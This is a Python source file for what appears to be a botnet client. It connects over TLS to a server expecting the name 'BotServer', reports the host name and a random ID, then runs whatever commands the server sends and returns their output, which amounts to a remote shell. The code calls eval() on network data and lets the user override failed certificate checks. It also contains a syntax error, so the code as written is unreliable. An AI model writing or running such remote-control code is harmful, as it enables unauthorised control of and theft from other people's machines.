#!/usr/bin/env python3
import sys
import ssl
import socket
import subprocess
import pymysql
from hashlib import md5
from random import randint, getrandbits

#TODO: Tidy and Clean code up

class Client:
    cert = "ssl_files/certificate.crt"

    def __init__(self):
        addr = (input("IP: "), int(input("Port: ")))
        self.client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        ssl_client = self.ssl_wrap(addr)

        if ssl_client == -1:
            self.client_sock.close()
            print("[-] Client closed.")
            sys.exit(-1)

        ID = str(getrandbits(randint(0, 999999)))
        hashID = md5(ID.encode("utf-8")).hexdigest()

        ssl_client.send("{}:--_:_--:{}".format(socket.gethostname(), hashID).encode("utf-8"))
        print("[+] Connected to server, Client-ID: {}".format(hashID))

        try:
            while True:
                #receievs/replies command-ID and command
                data = ssl_client.read().decode("utf-8")
                if not data or eval(data)[0] != "COMMAND": break
                data = eval(data)
                print(data)
                res = self.command(data[1][2])
                res = res.stdout if res.stdout else res.stderr
                rep = str(["COMMAND_RESULT", data[1][0], data[1][1], data[1][2], res.decode("utf-8")]).encode("utf-8")
                ssl_client.write(rep)

        except KeyboardInterrupt:
            ssl_client.write("[EXIT]").encode("utf-8"))

        ssl_client.close()
        self.client_sock.close()
        print("[-] Client closed.")
        print("[-] Server closed.")

    def ssl_wrap(self, addr):
        ssl_sock = ssl.wrap_socket(self.client_sock, cert_reqs=ssl.CERT_REQUIRED, ssl_version=ssl.PROTOCOL_TLSv1, ca_certs=Client.cert)
        ssl_sock.connect(addr)

        cert = ssl_sock.getpeercert()
        if not cert or ssl.match_hostname(cert, "BotServer"):
            print("{}Invalid certificate from server.".format("\033[1;31m"))
            cont = input("\033[1;37mKeep connection to Server, may be unsecure [y/n]: ").lower()
            if cont != "y" and cont != "yes": return -1
        return ssl_sock

    def command(self, cmd):
        print(cmd.split(" "))
        res = subprocess.run(cmd.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("COMMAND: {}\n".format(cmd))
        return res

if __name__ == '__main__':
    Client()
